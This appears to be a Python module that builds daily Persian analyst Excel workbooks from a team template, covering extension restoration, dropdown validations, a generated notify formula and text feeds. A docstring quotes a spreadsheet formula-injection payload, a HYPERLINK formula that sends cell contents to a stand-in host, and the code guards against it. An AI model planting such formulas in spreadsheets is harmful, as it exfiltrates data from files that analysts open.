"""The daily Persian analyst workbook, built on the team's own template file.

This module is TRANSCRIBED rather than reinvented. Every awkward part of it exists because
of something the real template does:

- openpyxl DROPS the `<extLst>` block on save. That block carries the conditional
  formatting and data-validation extensions Excel expects, so a workbook saved without it
  opens with the analyst's colour rules and dropdowns silently gone. `_restore_extensions`
  re-attaches it by rewriting the xlsx zip directly, because openpyxl offers no way to
  preserve it.
- The template's own header row is MISSING the link column label, so every workbook the
  legacy exporter produced had an unlabelled final column.
- The template carries two stale validations: the score columns get a yes/no list from row
  304 down, and the gold-trend list stops at row 303 - so an analyst clicking a dropdown
  past row 303 is offered answers that do not belong in that column.
- The template has four sheets, but all 40 workbooks the team actually produced carry one.

The notify column is written as an Excel FORMULA, not a value, and that formula is
generated from `core.scoring`'s own thresholds and vocabulary. An analyst who edits a score
in the sheet sees the notify decision update the way the pipeline would compute it - the
workbook cannot drift into voting differently from `decide()`.
"""

from __future__ import annotations

import re
import shutil
import warnings
import zipfile
from copy import copy
from datetime import time, timedelta
from functools import lru_cache
from pathlib import Path

import jdatetime
from django.conf import settings
from openpyxl import load_workbook

from core.scoring import FLOOR, HIGH_BAR, HIGH_COUNT_REQUIRED, MIN_AXES_ASSESSED, decide
from core.vocabulary import GOLD_TRENDS, LEVELS, NotifyStatus

HEADERS = [
    "شناسه خبر", "تاریخ انتشار", "ساعت انتشار", "منبع", "تیتر خبر",
    "اطمینان از وقوع خبر", "چقدر بر تغییر قیمت طلا اثر دارد؟",
    "چقدربا امنیت مرتبط است ؟", "جهت طلا", "وضعیت اطلاع رسانی", "توضیحات", "لینک",
]
SHEET = "بررسی خبر"
MAX_STYLED_ROW = 504  # the template pre-styles to here; dropdowns must cover the same span
FIRST_DATA_ROW = 3
ID_HEADER = "شناسه خبر"
NOTIFY_HEADER = "وضعیت اطلاع رسانی"


def persian_date(value: str | None) -> str:
    """'1405-06-11' -> '11 شهریور 1405', the form the team files under."""
    if not value:
        return ""
    try:
        year, month, day = map(int, value.replace("/", "-").split("-"))
        return f"{day} {jdatetime.date.j_months_fa[month - 1]} {year}"
    except (ValueError, IndexError):
        return value


def workbook_filename(day: str) -> str:
    """The naming convention the team already files by. An ISO date would land the same
    content under names nobody recognises."""
    return f"ثبت و تحلیل خبر - {persian_date(day) or day}.xlsx"


def _time_value(value: str | None) -> time | str:
    if not value:
        return ""
    try:
        hour, minute = map(int, value.split(":")[:2])
        return time(hour, minute)
    except ValueError:
        return value


def _formula(row: int) -> str:
    """The in-sheet notify formula, built from core.scoring's own thresholds and
    vocabulary so the workbook cannot drift into voting differently from decide().

    The INSUFFICIENT branch is the whole point of the first IF. `decide()` returns a third
    state when fewer than two axes were assessed, and a formula that could only say notify
    or do-not-notify silently reported a row with blank scores as "do not notify" - the
    same collapse of "not assessed" into "not notable" that this system was rebuilt to
    remove, reintroduced in the artifact the analyst actually reads.

    Assessed axes are counted by matching the vocabulary rather than with COUNTA, mirroring
    `level_score`: a cell holding something that is not a level was not an assessment.
    """
    axes = f"F{row}:H{row}"

    def count(levels) -> str:
        return "+".join(f'COUNTIF({axes},"{level}")' for level in levels)

    assessed = count(LEVELS)
    high = count(LEVELS[HIGH_BAR - 1:])
    below_floor = count(LEVELS[: FLOOR - 1])
    return (
        f'=IF({assessed}<{MIN_AXES_ASSESSED},"{NotifyStatus.INSUFFICIENT}",'
        f'IF(AND({high}>={HIGH_COUNT_REQUIRED},{below_floor}=0),'
        f'"{NotifyStatus.NOTIFY}","{NotifyStatus.NO_NOTIFY}"))'
    )


# ------------------------------------------------------------------------- data source


def _jalali_day(moment) -> str:
    """Tehran-local Jalali date for a UTC timestamp, or '' when there is no timestamp."""
    if moment is None:
        return ""
    from zoneinfo import ZoneInfo

    from core.text import jalali_str, to_jalali

    return jalali_str(to_jalali(moment.astimezone(ZoneInfo(settings.TEHRAN_TZ))))


def rows(articles=None) -> list[dict[str, str]]:
    """One record per canonical article, keyed by the workbook's own column headers.

    Deliberately does NOT number the rows. «شناسه خبر» is a position within a file, and
    this function does not know which file a record will end up in - see `build_workbook`.
    """
    from articles.models import Article
    from inference.models import Classification, Evaluation, Summary

    queryset = articles if articles is not None else Article.objects.canonical()
    queryset = queryset.order_by("published_at", "url")

    # Three queries rather than a correlated subquery per row: DISTINCT ON gives the latest
    # answer per article in one pass each, and the corpus is small enough to index in memory.
    latest_class = {c.article_id: c for c in Classification.objects.latest_per_article()}
    latest_eval = {e.article_id: e for e in Evaluation.objects.latest_per_article()}
    latest_summary = {s.article_id: s for s in Summary.objects.latest_per_article()}

    records = []
    for article in queryset:
        # Normally written at ingest. Derived here as a fallback because an article with a
        # publication date but an empty Jalali field would otherwise be silently dropped
        # from every daily workbook - the file would just be shorter, with nothing to see.
        day = article.published_at_jalali or _jalali_day(article.published_at)
        classification = latest_class.get(article.pk)
        evaluation = latest_eval.get(article.pk)
        summary = latest_summary.get(article.pk)
        scores = (
            evaluation.confidence_occurrence if evaluation else None,
            evaluation.gold_price_impact if evaluation else None,
            evaluation.security_relevance if evaluation else None,
        )
        records.append({
            "_day": day,
            # Fetch time, not publication time: it is what decides whether this day's
            # workbook can still change. See `_days_worth_rebuilding`.
            "_fetched_at": article.fetched_at,
            "_category": classification.category if classification else "other",
            "تاریخ انتشار": persian_date(day),
            "ساعت انتشار": article.published_time or "",
            "منبع": article.original_outlet or article.source_id,
            "تیتر خبر": (summary.optimized_title if summary else "") or article.original_title,
            "اطمینان از وقوع خبر": scores[0] or "",
            "چقدر بر تغییر قیمت طلا اثر دارد؟": scores[1] or "",
            "چقدربا امنیت مرتبط است ؟": scores[2] or "",
            "جهت طلا": (evaluation.gold_trend if evaluation else "") or "",
            NOTIFY_HEADER: decide(*scores).status,
            "توضیحات": (summary.one_line if summary else "") or "",
            "لینک": article.url,
        })
    return records


# ---------------------------------------------------------------------- xlsx machinery


@lru_cache(maxsize=1)
def _template_sheet_xml() -> bytes:
    """The template's sheet1.xml, read once - a nightly export rebuilds a workbook per day."""
    with zipfile.ZipFile(settings.WORKBOOK_TEMPLATE_PATH) as source:
        return source.read("xl/worksheets/sheet1.xml")


def _ext_list_span(xml: bytes) -> tuple[int, int]:
    """(start, end) byte offsets of the <extLst> block, or (-1, -1) when absent."""
    start = xml.find(b"<extLst")
    end = xml.find(b"</extLst>", start)
    return (start, end + len(b"</extLst>")) if start >= 0 and end >= 0 else (-1, -1)


def _restore_extensions(path: Path) -> None:
    """Re-attach the template's extLst block, which openpyxl drops on save.

    Done by rewriting the zip directly because openpyxl exposes no hook for it. Without
    this the workbook opens with the analyst's conditional formatting and validation
    extensions silently missing - the file still opens, which is why it went unnoticed.
    """
    template_xml = _template_sheet_xml()
    ext_start, ext_end = _ext_list_span(template_xml)
    if ext_start < 0:
        return
    extension = template_xml[ext_start:ext_end]

    with zipfile.ZipFile(path) as source:
        payload = {entry.filename: source.read(entry.filename) for entry in source.infolist()}
    xml = payload["xl/worksheets/sheet1.xml"]

    def root_span(document: bytes) -> tuple[int, int]:
        start = document.find(b"<worksheet")
        return start, document.find(b">", start)

    # openpyxl may omit namespaces the extension block references; copy any it dropped, or
    # Excel rejects the file outright.
    root_end = root_span(xml)[1]
    template_start, template_end = root_span(template_xml)
    namespaces = re.findall(
        rb'\s(xmlns(?::[A-Za-z0-9]+)?="[^"]+")', template_xml[template_start:template_end + 1]
    )
    missing = [ns for ns in namespaces if ns.split(b"=", 1)[0] not in xml[:root_end]]
    if missing:
        xml = xml[:root_end] + b" " + b" ".join(missing) + xml[root_end:]

    start, end = _ext_list_span(xml)
    if start >= 0:
        xml = xml[:start] + xml[end:]
    payload["xl/worksheets/sheet1.xml"] = xml.replace(b"</worksheet>", extension + b"</worksheet>")

    temporary = path.with_suffix(".tmp")
    with zipfile.ZipFile(temporary, "w", zipfile.ZIP_DEFLATED) as target:
        for name, content in payload.items():
            target.writestr(name, content)
    temporary.replace(path)


def _fix_validations(sheet) -> None:
    """Point the template's dropdowns at the values this pipeline actually writes."""
    from openpyxl.worksheet.datavalidation import DataValidation

    sheet.data_validations.dataValidation = []
    for values, span in ((LEVELS, f"F3:H{MAX_STYLED_ROW}"), (GOLD_TRENDS, f"I3:I{MAX_STYLED_ROW}")):
        validation = DataValidation(type="list", formula1=f'"{",".join(values)}"', allow_blank=True)
        sheet.add_data_validation(validation)
        validation.add(span)


def _keep_as_text(cell) -> None:
    """Stop a crawled headline from becoming a live formula.

    openpyxl types any string beginning with `=` as a FORMULA - `data_type` comes back
    `'f'` and the value is written into an `<f>` element, not a string. Article titles,
    leads and outlet names are taken verbatim from third-party markup, so a headline of
    `=HYPERLINK("http://x/?"&A2,"مشاهده خبر")` ships a working exfiltration link inside the
    file an analyst opens, in the column they are meant to click. This is the spreadsheet
    half of injection: the payload is inert everywhere in this system except in Excel.

    Forcing the type writes `t="inlineStr"`, so the text is preserved exactly - no leading
    apostrophe, which is a display convention of Excel's UI and not something the file
    format carries. The notify column is a formula we generate ourselves and never passes
    through here; only values do.
    """
    if cell.data_type == "f":
        cell.data_type = "s"


def _copy_row_style(sheet, source: int, target: int) -> None:
    for column in range(1, len(HEADERS) + 1):
        origin, destination = sheet.cell(source, column), sheet.cell(target, column)
        destination._style = copy(origin._style)
        for attribute in ("number_format", "protection", "alignment", "fill", "font", "border"):
            setattr(destination, attribute, copy(getattr(origin, attribute)))
    sheet.row_dimensions[target].height = sheet.row_dimensions[source].height


def build_workbook(records: list[dict[str, str]], target: Path) -> Path:
    """Clone the template into a daily workbook, preserving its styling."""
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy2(settings.WORKBOOK_TEMPLATE_PATH, target)
    with warnings.catch_warnings():
        warnings.filterwarnings(
            "ignore", message=r".*extension is not supported.*", category=UserWarning
        )
        workbook = load_workbook(target)
    for name in list(workbook.sheetnames):
        if name != SHEET:
            del workbook[name]
    sheet = workbook[SHEET]
    # The template's own header row is missing this cell.
    sheet.cell(2, len(HEADERS)).value = HEADERS[-1]
    _fix_validations(sheet)

    last_existing = max(sheet.max_row, FIRST_DATA_ROW)
    for row in range(FIRST_DATA_ROW, last_existing + 1):
        for column in range(1, len(HEADERS) + 1):
            cell = sheet.cell(row, column)
            cell.value, cell.hyperlink = None, None

    for index, record in enumerate(records, FIRST_DATA_ROW):
        if index > last_existing:
            _copy_row_style(sheet, FIRST_DATA_ROW, index)
        for column, header in enumerate(HEADERS, 1):
            cell = sheet.cell(index, column)
            if header == ID_HEADER:
                # A NUMBER, and numbered from this file's own row position. Both halves are
                # measured against the team's output: all 40 workbooks store an integer here
                # and all 40 run 1..N within the file. The exporter used to write a string,
                # and to number the whole canonical corpus before grouping the records by
                # day - so the second day of a deployment opened at «شناسه خبر» 51,
                # left-aligned as text. Deriving it from the row means no way of selecting
                # records can reintroduce either.
                cell.value = index - FIRST_DATA_ROW + 1
            elif header == NOTIFY_HEADER:
                cell.value = _formula(index)
            elif header == "ساعت انتشار":
                cell.value = _time_value(record[header])
            else:
                cell.value = record[header]
                _keep_as_text(cell)
                # Only http(s) becomes a clickable link. `url` is taken verbatim from a
                # crawled listing's href, `urljoin` resolves `javascript:...` to itself, and
                # nothing between there and here rejects it - `quality_reason` records
                # `invalid_url` as a flag but does not stop the row reaching the workbook.
                if header == "لینک" and record[header].startswith(("http://", "https://")):
                    cell.hyperlink = record[header]
    workbook.save(target)
    workbook.close()
    _restore_extensions(target)
    return target


def feed_text(records: list[dict[str, str]]) -> str:
    return "\n\n".join(
        f"{record['تیتر خبر']}\n\n{record['توضیحات']}\n\n"
        f"{record['منبع']} | {record['تاریخ انتشار']} | {record['ساعت انتشار']}\n" + "-" * 50
        for record in records
    ) + ("\n" if records else "")


def _days_worth_rebuilding(records: list[dict], window_days: int) -> set[str]:
    """The Jalali days whose workbook could still say something different.

    A day's content changes only when one of its articles gets a new answer, and
    `inference.run_cycle` only ever considers articles fetched inside the same rolling
    window - so a day with nothing fetched recently is a day whose file would be rewritten
    byte for byte.

    Keyed on FETCH time, not publication time, and for the same reason `in_window` is: a
    backfill run pulls in months-old articles today, and their workbook is an old day's file
    that genuinely does need rebuilding.

    Computed from the records rather than by a second query, so `_day` here is necessarily
    the same string `rows()` filed the article under - including its fallback for an article
    whose Jalali field was never written.
    """
    from django.utils import timezone

    cutoff = timezone.now() - timedelta(days=max(window_days, 1))
    return {
        record["_day"]
        for record in records
        if record["_day"] and record["_fetched_at"] >= cutoff
    }


def export_all(
    directory: Path | None = None, *, window_days: int | None = None
) -> dict[str, Path]:
    """One workbook per Jalali day, plus the notify feed and one file per category.

    `window_days` bounds which workbooks are REBUILT. None means every day in the corpus,
    which is what a fresh deployment or a post-import backfill wants; the scheduled path in
    `exports.tasks.build_daily_workbook` passes the rolling window instead. The text feeds
    always cover the whole corpus either way - they are one file each rather than one per
    day, so bounding them would just lose data.
    """
    from core.vocabulary import CATEGORIES

    directory = Path(directory or settings.EXPORT_DIR)
    directory.mkdir(parents=True, exist_ok=True)
    records = rows()
    # `other` articles are stored and visible in the app, but the analyst workbook is a
    # security/economics instrument and the team's own files never carried them.
    eligible = [record for record in records if record["_category"] != "other"]
    wanted = (
        None if window_days is None else _days_worth_rebuilding(eligible, window_days)
    )

    by_day: dict[str, list[dict[str, str]]] = {}
    for record in eligible:
        if record["_day"] and (wanted is None or record["_day"] in wanted):
            by_day.setdefault(record["_day"], []).append(record)

    files = {
        f"excel:{day}": build_workbook(
            day_rows, directory / "Excel Files" / workbook_filename(day)
        )
        for day, day_rows in by_day.items()
    }
    important = directory / "important_news.txt"
    important.write_text(
        feed_text([r for r in eligible if r[NOTIFY_HEADER] == NotifyStatus.NOTIFY]),
        encoding="utf-8",
    )
    files["important"] = important
    for category in CATEGORIES:
        path = directory / "TXT Files" / f"{category.replace('/', '_')}_news.txt"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            feed_text([r for r in records if r["_category"] == category]), encoding="utf-8"
        )
        files[f"text:{category}"] = path
    return files
